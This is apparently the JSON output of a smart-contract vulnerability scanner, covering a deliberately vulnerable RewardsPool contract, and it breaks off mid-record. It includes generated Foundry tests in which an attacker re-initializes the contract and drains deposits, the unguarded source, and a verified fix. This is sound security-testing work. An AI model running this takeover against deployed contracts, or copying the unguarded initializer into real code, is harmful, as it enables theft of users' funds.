@@ -1,0 +1,1062 @@
+{
+  "repo": "local:examples/initializer-takeover",
+  "commit": "86639bb08cb0821fcbab094bf0a21c2085775e02f32a480f09689132fcb0b052",
+  "startedAt": "2026-11-06T15:28:11.795Z",
+  "finishedAt": "2026-11-06T15:28:25.569Z",
+  "tools": [
+    {
+      "name": "forge",
+      "version": "forge Version: 1.8.7"
+    },
+    {
+      "name": "slither",
+      "version": "0.11.6"
+    },
+    {
+      "name": "aderyn",
+      "version": "aderyn 0.6.8"
+    },
+    {
+      "name": "solc",
+      "version": "0.8.20,0.8.24,0.8.26,0.8.28,0.8.30,0.8.33,0.8.35,0.8.38"
+    },
+    {
+      "name": "pramaan-sandbox",
+      "version": "1"
+    }
+  ],
+  "build": {
+    "ok": true,
+    "log": "Compiling 22 files with Solc 0.8.30\nSolc 0.8.30 finished in 2.29s\nCompiler run successful!\nwarning[missing-zero-check]: address parameter is used in a state write or value transfer without a zero-address check\n   ╭▸ src/RewardsPool.sol:14:25\n   │\n14 │     function initialize(address owner_, uint256 rewardRate_) external {\n   │                         ━━━━━━━━━━━━━━\n   │\n   ╰ help: https://getfoundry.sh/forge/linting/missing-zero-check\n\n"
+  },
+  "scanners": {
+    "slither": {
+      "ok": true,
+      "error": null,
+      "results": 3
+    },
+    "aderyn": {
+      "ok": true,
+      "error": null,
+      "results": 4
+    }
+  },
+  "contracts": [
+    {
+      "name": "RewardsPoolFixed",
+      "source": "src/RewardsPoolFixed.sol",
+      "kind": "contract",
+      "abstract": false,
+      "bases": [],
+      "deployable": true,
+      "abi": [
+        {
+          "type": "function",
+          "name": "emergencyWithdraw",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "function",
+          "name": "fund",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "initialize",
+          "inputs": [
+            {
+              "name": "owner_",
+              "type": "address",
+              "internalType": "address"
+            },
+            {
+              "name": "rewardRate_",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "function",
+          "name": "owner",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "rewardRate",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "event",
+          "name": "Funded",
+          "inputs": [
+            {
+              "name": "from",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Initialized",
+          "inputs": [
+            {
+              "name": "owner",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "rewardRate",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        }
+      ],
+      "functions": [
+        {
+          "name": "initialize",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [
+            {
+              "name": "owner_",
+              "type": "address"
+            },
+            {
+              "name": "rewardRate_",
+              "type": "uint256"
+            }
+          ],
+          "src": {
+            "start": 359,
+            "length": 292,
+            "bodyStart": 425
+          },
+          "lines": [
+            12,
+            18
+          ]
+        },
+        {
+          "name": "fund",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "payable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 657,
+            "length": 84,
+            "bodyStart": 690
+          },
+          "lines": [
+            20,
+            22
+          ]
+        },
+        {
+          "name": "emergencyWithdraw",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 747,
+            "length": 212,
+            "bodyStart": 785
+          },
+          "lines": [
+            24,
+            28
+          ]
+        }
+      ]
+    },
+    {
+      "name": "RewardsPool",
+      "source": "src/RewardsPool.sol",
+      "kind": "contract",
+      "abstract": false,
+      "bases": [],
+      "deployable": true,
+      "abi": [
+        {
+          "type": "function",
+          "name": "emergencyWithdraw",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "function",
+          "name": "fund",
+          "inputs": [],
+          "outputs": [],
+          "stateMutability": "payable"
+        },
+        {
+          "type": "function",
+          "name": "initialize",
+          "inputs": [
+            {
+              "name": "owner_",
+              "type": "address",
+              "internalType": "address"
+            },
+            {
+              "name": "rewardRate_",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "outputs": [],
+          "stateMutability": "nonpayable"
+        },
+        {
+          "type": "function",
+          "name": "owner",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "address",
+              "internalType": "address"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "function",
+          "name": "rewardRate",
+          "inputs": [],
+          "outputs": [
+            {
+              "name": "",
+              "type": "uint256",
+              "internalType": "uint256"
+            }
+          ],
+          "stateMutability": "view"
+        },
+        {
+          "type": "event",
+          "name": "Funded",
+          "inputs": [
+            {
+              "name": "from",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "amount",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        },
+        {
+          "type": "event",
+          "name": "Initialized",
+          "inputs": [
+            {
+              "name": "owner",
+              "type": "address",
+              "indexed": true,
+              "internalType": "address"
+            },
+            {
+              "name": "rewardRate",
+              "type": "uint256",
+              "indexed": false,
+              "internalType": "uint256"
+            }
+          ],
+          "anonymous": false
+        }
+      ],
+      "functions": [
+        {
+          "name": "initialize",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [
+            {
+              "name": "owner_",
+              "type": "address"
+            },
+            {
+              "name": "rewardRate_",
+              "type": "uint256"
+            }
+          ],
+          "src": {
+            "start": 560,
+            "length": 178,
+            "bodyStart": 626
+          },
+          "lines": [
+            14,
+            18
+          ]
+        },
+        {
+          "name": "fund",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "payable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 744,
+            "length": 84,
+            "bodyStart": 777
+          },
+          "lines": [
+            20,
+            22
+          ]
+        },
+        {
+          "name": "emergencyWithdraw",
+          "kind": "function",
+          "visibility": "external",
+          "stateMutability": "nonpayable",
+          "modifiers": [],
+          "parameters": [],
+          "src": {
+            "start": 834,
+            "length": 212,
+            "bodyStart": 872
+          },
+          "lines": [
+            24,
+            28
+          ]
+        }
+      ]
+    }
+  ],
+  "candidates": [
+    {
+      "key": "unprotected-initializer:RewardsPool:initialize(address,uint256)",
+      "vulnClass": "unprotected-initializer",
+      "title": "Initializer can be called again by anyone",
+      "severity": "high",
+      "confidence": "high",
+      "contract": "RewardsPool",
+      "function": "initialize(address,uint256)",
+      "file": "src/RewardsPool.sol",
+      "lines": [
+        14,
+        15,
+        16,
+        17,
+        18
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "pramaan-unprotected-initializer",
+          "description": "RewardsPool.initialize(address,uint256) (src/RewardsPool.sol#14-18) writes privileged state and can be called again by anyone"
+        },
+        {
+          "tool": "aderyn",
+          "detector": "unprotected-initializer",
+          "description": "Unprotected initializer"
+        }
+      ]
+    },
+    {
+      "key": "unprotected-initializer:RewardsPoolFixed:initialize(address,uint256)",
+      "vulnClass": "unprotected-initializer",
+      "title": "Initializer can be called again by anyone",
+      "severity": "high",
+      "confidence": "medium",
+      "contract": "RewardsPoolFixed",
+      "function": "initialize(address,uint256)",
+      "file": "src/RewardsPoolFixed.sol",
+      "lines": [
+        12,
+        13,
+        14,
+        15,
+        16,
+        17,
+        18
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "pramaan-unprotected-initializer",
+          "description": "RewardsPoolFixed.initialize(address,uint256) (src/RewardsPoolFixed.sol#12-18) writes privileged state and can be called again by anyone"
+        }
+      ]
+    },
+    {
+      "key": "missing-zero-check:RewardsPool:-",
+      "vulnClass": "missing-zero-check",
+      "title": "missing-zero-check",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "RewardsPool",
+      "function": null,
+      "file": "src/RewardsPool.sol",
+      "lines": [
+        14
+      ],
+      "sources": [
+        {
+          "tool": "slither",
+          "detector": "missing-zero-check",
+          "description": "RewardsPool.initialize(address,uint256).owner_ (src/RewardsPool.sol#14) lacks a zero-check on :\n\t\t- owner = owner_ (src/RewardsPool.sol#15)"
+        }
+      ]
+    },
+    {
+      "key": "push-zero-opcode:src/RewardsPool.sol:L2",
+      "vulnClass": "push-zero-opcode",
+      "title": "PUSH0 Opcode",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/RewardsPool.sol",
+      "function": null,
+      "file": "src/RewardsPool.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "push-zero-opcode",
+          "description": "PUSH0 Opcode"
+        }
+      ]
+    },
+    {
+      "key": "push-zero-opcode:src/RewardsPoolFixed.sol:L2",
+      "vulnClass": "push-zero-opcode",
+      "title": "PUSH0 Opcode",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/RewardsPoolFixed.sol",
+      "function": null,
+      "file": "src/RewardsPoolFixed.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "push-zero-opcode",
+          "description": "PUSH0 Opcode"
+        }
+      ]
+    },
+    {
+      "key": "state-no-address-check:RewardsPool:initialize(address,uint256)",
+      "vulnClass": "state-no-address-check",
+      "title": "Address State Variable Set Without Checks",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "RewardsPool",
+      "function": "initialize(address,uint256)",
+      "file": "src/RewardsPool.sol",
+      "lines": [
+        15
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "state-no-address-check",
+          "description": "Address State Variable Set Without Checks"
+        }
+      ]
+    },
+    {
+      "key": "unspecific-solidity-pragma:src/RewardsPool.sol:L2",
+      "vulnClass": "unspecific-solidity-pragma",
+      "title": "Unspecific Solidity Pragma",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/RewardsPool.sol",
+      "function": null,
+      "file": "src/RewardsPool.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "unspecific-solidity-pragma",
+          "description": "Unspecific Solidity Pragma"
+        }
+      ]
+    },
+    {
+      "key": "unspecific-solidity-pragma:src/RewardsPoolFixed.sol:L2",
+      "vulnClass": "unspecific-solidity-pragma",
+      "title": "Unspecific Solidity Pragma",
+      "severity": "low",
+      "confidence": "medium",
+      "contract": "src/RewardsPoolFixed.sol",
+      "function": null,
+      "file": "src/RewardsPoolFixed.sol",
+      "lines": [
+        2
+      ],
+      "sources": [
+        {
+          "tool": "aderyn",
+          "detector": "unspecific-solidity-pragma",
+          "description": "Unspecific Solidity Pragma"
+        }
+      ]
+    }
+  ],
+  "findings": [
+    {
+      "id": "PRM-1",
+      "candidate": {
+        "key": "unprotected-initializer:RewardsPool:initialize(address,uint256)",
+        "vulnClass": "unprotected-initializer",
+        "title": "Initializer can be called again by anyone",
+        "severity": "high",
+        "confidence": "high",
+        "contract": "RewardsPool",
+        "function": "initialize(address,uint256)",
+        "file": "src/RewardsPool.sol",
+        "lines": [
+          14,
+          15,
+          16,
+          17,
+          18
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "pramaan-unprotected-initializer",
+            "description": "RewardsPool.initialize(address,uint256) (src/RewardsPool.sol#14-18) writes privileged state and can be called again by anyone"
+          },
+          {
+            "tool": "aderyn",
+            "detector": "unprotected-initializer",
+            "description": "Unprotected initializer"
+          }
+        ]
+      },
+      "templateId": "initializer-takeover",
+      "plan": {
+        "templateId": "initializer-takeover",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "RewardsPool",
+          "source": "src/RewardsPool.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [],
+          "initializer": {
+            "name": "initialize",
+            "args": [
+              "owner",
+              "0"
+            ]
+          }
+        },
+        "fund": {
+          "fn": "fund",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "initialize",
+          "args": [
+            "attacker",
+            "0"
+          ]
+        },
+        "drain": {
+          "fn": "emergencyWithdraw",
+          "args": []
+        },
+        "hasOwnerGetter": true,
+        "hypothesis": "RewardsPool.initialize(address,uint256) can be called again after deployment and hands its caller privileged roles.",
+        "property": "Only the deployer-chosen owner may control the contract after initialization.",
+        "preconditions": [
+          "the contract was deployed and initialized by its owner",
+          "a victim has deposited SEED (10 ether)"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_1.t.sol",
+        "contractName": "PramaanExploit_PRM_1",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-1: template initializer-takeover@1, slots filled by heuristics.\n// Hypothesis: RewardsPool.initialize(address,uint256) can be called again after deployment and hands its caller privileged roles.\n// Property under test: Only the deployer-chosen owner may control the contract after initialization.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {RewardsPool as PramaanTarget} from \"src/RewardsPool.sol\";\n\ncontract PramaanExploit_PRM_1 is Test {\n    PramaanTarget internal target;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        target = new PramaanTarget();\n        target.initialize(owner, 0);\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.fund{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 attackerBefore = attacker.balance;\n        vm.startPrank(attacker);\n        target.initialize(attacker, 0);\n        target.emergencyWithdraw();\n        vm.stopPrank();\n        emit log_named_uint(\"pramaan.attacker_gain\", attacker.balance - attackerBefore);\n        assertGe(attacker.balance - attackerBefore, SEED, \"Pramaan: re-initialising let an outsider take deposited ETH\");\n    }\n}\n",
+        "sha256": "7f53d60779e8d57ca7f4ee1a7e2cefffdadca3fe494614ad360b3b719136eeb7"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "5 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "passed",
+        "reason": null,
+        "logs": [
+          "pramaan.attacker_gain: 10000000000000000000"
+        ],
+        "durationMs": null
+      },
+      "status": "reproduced",
+      "pairs": [
+        {
+          "fixedContract": "RewardsPoolFixed",
+          "test": {
+            "fileName": "PramaanExploit_PRM_1_RewardsPoolFixed.t.sol",
+            "contractName": "PramaanExploit_PRM_1_RewardsPoolFixed",
+            "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-1: template initializer-takeover@1, slots filled by heuristics.\n// Hypothesis: RewardsPool.initialize(address,uint256) can be called again after deployment and hands its caller privileged roles.\n// Property under test: Only the deployer-chosen owner may control the contract after initialization.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {RewardsPoolFixed as PramaanTarget} from \"src/RewardsPoolFixed.sol\";\n\ncontract PramaanExploit_PRM_1_RewardsPoolFixed is Test {\n    PramaanTarget internal target;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        target = new PramaanTarget();\n        target.initialize(owner, 0);\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.fund{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 attackerBefore = attacker.balance;\n        vm.startPrank(attacker);\n        target.initialize(attacker, 0);\n        target.emergencyWithdraw();\n        vm.stopPrank();\n        emit log_named_uint(\"pramaan.attacker_gain\", attacker.balance - attackerBefore);\n        assertGe(attacker.balance - attackerBefore, SEED, \"Pramaan: re-initialising let an outsider take deposited ETH\");\n    }\n}\n",
+            "sha256": "93d1f3bd1660bb91e2f01e3c020bf90afd7aac9e6582759728c27e6eaf5cd0e6"
+          },
+          "outcome": {
+            "kind": "reverted",
+            "reason": "already initialized"
+          },
+          "verified": true
+        }
+      ]
+    },
+    {
+      "id": "PRM-2",
+      "candidate": {
+        "key": "unprotected-initializer:RewardsPoolFixed:initialize(address,uint256)",
+        "vulnClass": "unprotected-initializer",
+        "title": "Initializer can be called again by anyone",
+        "severity": "high",
+        "confidence": "medium",
+        "contract": "RewardsPoolFixed",
+        "function": "initialize(address,uint256)",
+        "file": "src/RewardsPoolFixed.sol",
+        "lines": [
+          12,
+          13,
+          14,
+          15,
+          16,
+          17,
+          18
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "pramaan-unprotected-initializer",
+            "description": "RewardsPoolFixed.initialize(address,uint256) (src/RewardsPoolFixed.sol#12-18) writes privileged state and can be called again by anyone"
+          }
+        ]
+      },
+      "templateId": "initializer-takeover",
+      "plan": {
+        "templateId": "initializer-takeover",
+        "version": "1",
+        "filledBy": "heuristics",
+        "target": {
+          "name": "RewardsPoolFixed",
+          "source": "src/RewardsPoolFixed.sol"
+        },
+        "deploy": {
+          "kind": "direct",
+          "ctorArgs": [],
+          "initializer": {
+            "name": "initialize",
+            "args": [
+              "owner",
+              "0"
+            ]
+          }
+        },
+        "fund": {
+          "fn": "fund",
+          "valueExpr": "SEED"
+        },
+        "attack": {
+          "fn": "initialize",
+          "args": [
+            "attacker",
+            "0"
+          ]
+        },
+        "drain": {
+          "fn": "emergencyWithdraw",
+          "args": []
+        },
+        "hasOwnerGetter": true,
+        "hypothesis": "RewardsPoolFixed.initialize(address,uint256) can be called again after deployment and hands its caller privileged roles.",
+        "property": "Only the deployer-chosen owner may control the contract after initialization.",
+        "preconditions": [
+          "the contract was deployed and initialized by its owner",
+          "a victim has deposited SEED (10 ether)"
+        ]
+      },
+      "planError": null,
+      "test": {
+        "fileName": "PramaanExploit_PRM_2.t.sol",
+        "contractName": "PramaanExploit_PRM_2",
+        "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-2: template initializer-takeover@1, slots filled by heuristics.\n// Hypothesis: RewardsPoolFixed.initialize(address,uint256) can be called again after deployment and hands its caller privileged roles.\n// Property under test: Only the deployer-chosen owner may control the contract after initialization.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {RewardsPoolFixed as PramaanTarget} from \"src/RewardsPoolFixed.sol\";\n\ncontract PramaanExploit_PRM_2 is Test {\n    PramaanTarget internal target;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        target = new PramaanTarget();\n        target.initialize(owner, 0);\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.fund{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 attackerBefore = attacker.balance;\n        vm.startPrank(attacker);\n        target.initialize(attacker, 0);\n        target.emergencyWithdraw();\n        vm.stopPrank();\n        emit log_named_uint(\"pramaan.attacker_gain\", attacker.balance - attackerBefore);\n        assertGe(attacker.balance - attackerBefore, SEED, \"Pramaan: re-initialising let an outsider take deposited ETH\");\n    }\n}\n",
+        "sha256": "152dba0506ec578246e082c8b9312a7e9e1819dbdfee49a8c534697ade96c6c2"
+      },
+      "gates": [
+        {
+          "id": "slot-vocabulary",
+          "passed": true,
+          "detail": "5 slot values from the allowed vocabulary"
+        },
+        {
+          "id": "no-state-forging",
+          "passed": true,
+          "detail": "attack phase uses no vm.store / etch / mockCall / deal(target) / ffi"
+        },
+        {
+          "id": "attacker-only",
+          "passed": true,
+          "detail": "pranks: attacker"
+        },
+        {
+          "id": "concrete-assertion",
+          "passed": true,
+          "detail": "asserts an attacker balance or owner change"
+        }
+      ],
+      "vulnerableRun": {
+        "result": "failed",
+        "reason": "already initialized",
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "not-reproduced",
+      "pairs": []
+    },
+    {
+      "id": "PRM-3",
+      "candidate": {
+        "key": "missing-zero-check:RewardsPool:-",
+        "vulnClass": "missing-zero-check",
+        "title": "missing-zero-check",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "RewardsPool",
+        "function": null,
+        "file": "src/RewardsPool.sol",
+        "lines": [
+          14
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "missing-zero-check",
+            "description": "RewardsPool.initialize(address,uint256).owner_ (src/RewardsPool.sol#14) lacks a zero-check on :\n\t\t- owner = owner_ (src/RewardsPool.sol#15)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"missing-zero-check\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-4",
+      "candidate": {
+        "key": "push-zero-opcode:src/RewardsPool.sol:L2",
+        "vulnClass": "push-zero-opcode",
+        "title": "PUSH0 Opcode",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/RewardsPool.sol",
+        "function": null,
+        "file": "src/RewardsPool.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "push-zero-opcode",
+            "description": "PUSH0 Opcode"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/RewardsPool.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-5",
+      "candidate": {
+        "key": "push-zero-opcode:src/RewardsPoolFixed.sol:L2",
+        "vulnClass": "push-zero-opcode",
+        "title": "PUSH0 Opcode",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/RewardsPoolFixed.sol",
+        "function": null,
+        "file": "src/RewardsPoolFixed.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "push-zero-opcode",
+            "description": "PUSH0 Opcode"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/RewardsPoolFixed.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-6",
+      "candidate": {
+        "key": "state-no-address-check:RewardsPool:initialize(address,uint256)",
+        "vulnClass": "state-no-address-check",
+        "title": "Address State Variable Set Without Checks",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "RewardsPool",
+        "function": "initialize(address,uint256)",
+        "file": "src/RewardsPool.sol",
+        "lines": [
+          15
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "state-no-address-check",
+            "description": "Address State Variable Set Without Checks"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"state-no-address-check\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-7",
+      "candidate": {
+        "key": "unspecific-solidity-pragma:src/RewardsPool.sol:L2",
+        "vulnClass": "unspecific-solidity-pragma",
+        "title": "Unspecific Solidity Pragma",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/RewardsPool.sol",
+        "function": null,
+        "file": "src/RewardsPool.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "unspecific-solidity-pragma",
+            "description": "Unspecific Solidity Pragma"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/RewardsPool.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-8",
+      "candidate": {
+        "key": "unspecific-solidity-pragma:src/RewardsPoolFixed.sol:L2",
+        "vulnClass": "unspecific-solidity-pragma",
+        "title": "Unspecific Solidity Pragma",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/RewardsPoolFixed.sol",
+        "function": null,
+        "file": "src/RewardsPoolFixed.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "unspecific-solidity-pragma",
+            "description": "Unspecific Solidity Pragma"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/RewardsPoolFixed.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    }
+  ],
+  "regression": {
+    "ran": true,
+    "passed": 2,
+    "failed": 0,
+    "skipped": 0,
+    "failures": []
+  },
+  "sandbox": {
+    "image": "pramaan/sandbox:0.1.0",
+    "analyzeMs": 7609,
+    "testMs": 6028
+  },
+  "fixes": {
+    "PRM-1": {
+      "fix": {
+        "generator": "deterministic",
+        "file": "src/RewardsPool.sol",
+        "before": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\n/// @notice DELIBERATELY VULNERABLE example: `initialize()` has no guard, so anyone can call it again after\n///         deployment, become the owner and use the owner-only emergency withdrawal. Used to exercise Pramaan's\n///         initializer-takeover template. Never deploy with real funds.\ncontract RewardsPool {\n    address public owner;\n    uint256 public rewardRate;\n\n    event Initialized(address indexed owner, uint256 rewardRate);\n    event Funded(address indexed from, uint256 amount);\n\n    function initialize(address owner_, uint256 rewardRate_) external {\n        owner = owner_;\n        rewardRate = rewardRate_;\n        emit Initialized(owner_, rewardRate_);\n    }\n\n    function fund() external payable {\n        emit Funded(msg.sender, msg.value);\n    }\n\n    function emergencyWithdraw() external {\n        require(msg.sender == owner, \"not owner\");\n        (bool ok,) = payable(owner).call{value: address(this).balance}(\"\");\n        require(ok, \"transfer failed\");\n    }\n}\n",
+        "after": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\n/// @notice DELIBERATELY VULNERABLE example: `initialize()` has no guard, so anyone can call it again after\n///         deployment, become the owner and use the owner-only emergency withdrawal. Used to exercise Pramaan's\n///         initializer-takeover template. Never deploy with real funds.\ncontract RewardsPool {\n    address public owner;\n    uint256 public rewardRate;\n\n    event Initialized(address indexed owner, uint256 rewardRate);\n    event Funded(address indexed from, uint256 amount);\n\n    function initialize(address owner_, uint256 rewardRate_) external {\n        require(this.owner() == address(0), \"already initialized\");\n        owner = owner_;\n        rewardRate = rewardRate_;\n        emit Initialized(owner_, rewardRate_);\n    }\n\n    function fund() external payable {\n        emit Funded(msg.sender, msg.value);\n    }\n\n    function emergencyWithdraw() external {\n        require(msg.sender == owner, \"not owner\");\n        (bool ok,) = payable(owner).call{value: address(this).balance}(\"\");\n        require(ok, \"transfer failed\");\n    }\n}\n",
+        "diff": "===================================================================\n--- a/src/RewardsPool.sol\n+++ b/src/RewardsPool.sol\n@@ -12,6 +12,7 @@\n     event Funded(address indexed from, uint256 amount);\n \n     function initialize(address owner_, uint256 rewardRate_) external {\n+        require(this.owner() == address(0), \"already initialized\");\n         owner = owner_;\n         rewardRate = rewardRate_;\n         emit Initialized(owner_, rewardRate_);\n",
+        "explanation": "RewardsPool.initialize() could be called again to take ownership. It now refuses to run once an owner exists.",
+        "change": "allow initialize() only while no owner is set"
+      },
+      "verification": {
+        "verified": true,
+        "exploit": {
+          "kind": "reverted",
+          "reason": "already initialized"
+        },
+        "regression": {
+          "ran": true,
+          "passed": 2,
+          "failed": 0,
+          "skipped": 0,
+          "failures": []
+        },
+        "test": {
+          "fileName": "PramaanExploit_PRM_1.t.sol",
+          "contractName": "PramaanExploit_PRM_1",
